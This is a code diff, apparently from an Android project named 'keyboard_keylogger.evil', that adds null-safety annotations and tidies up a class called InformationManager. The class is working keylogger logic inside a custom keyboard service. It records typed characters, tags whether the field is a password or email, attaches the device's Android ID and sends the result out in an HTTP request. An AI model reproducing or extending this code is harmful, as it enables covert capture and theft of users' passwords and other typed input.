@@ -2,6 +2,9 @@ package com.example.keyboard_keylogger.evil;
 
 import android.inputmethodservice.InputMethodService;
 import android.provider.Settings;
+
+import androidx.annotation.NonNull;
+
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -13,7 +16,7 @@ public class InformationManager {
     private String inputType;
 
 
-    public InformationManager(InputMethodService ime){
+    public InformationManager(@NonNull InputMethodService ime){
         this.text = new ArrayList<>();
         this.androidId = Settings.Secure.getString(ime.getContentResolver(), Settings.Secure.ANDROID_ID);
     }
@@ -24,28 +27,24 @@ public class InformationManager {
      * @param inputType Input Type like password, text, email, number...
      * @return JSONObject
      */
-    private JSONObject createJSONObject(ArrayList<Character> text,String inputType,String androidId) {
+    @NonNull
+    private JSONObject createJSONObject(ArrayList<Character> text, String inputType, String androidId) {
         String inputText = getStringRepresentation(text);
 
         JSONObject infoObject= new JSONObject();
         try {
             infoObject.put("text",inputText);
             infoObject.put("inputType",inputType);
-//            infoObject.put("fieldName",fieldName);
             infoObject.put("id",androidId);
-
-            //            obj.put("photo",slika);
         } catch (JSONException e) {
             e.printStackTrace();
         }
-
-
 
         return infoObject;
 
     }
 
-    public void addInputTypeFromIME(InputMethodService ime){
+    public void addInputTypeFromIME(@NonNull InputMethodService ime){
         this.inputType = determineInputType(ime.getCurrentInputEditorInfo().inputType);
     }
     public void addChar(char c){
@@ -57,10 +56,9 @@ public class InformationManager {
         new HTTPReqTask().setBody(infoObject.toString()).execute();
         text.clear();
     }
-    public ArrayList<Character> getText(){return text;}
 
-
-    private String getStringRepresentation(ArrayList<Character> list) {
+    @NonNull
+    private String getStringRepresentation(@NonNull ArrayList<Character> list) {
         StringBuilder builder = new StringBuilder(list.size());
         for(Character ch: list)
         {
@@ -68,6 +66,7 @@ public class InformationManager {
         }
         return builder.toString();
     }
+    @NonNull
     private String determineInputType(int inputType){
         if (InputTypeUtils.isPasswordInputType(inputType) || InputTypeUtils.isVisiblePasswordInputType(inputType)) return "Password";
         if (InputTypeUtils.isEmailVariation(inputType)) return "Email";
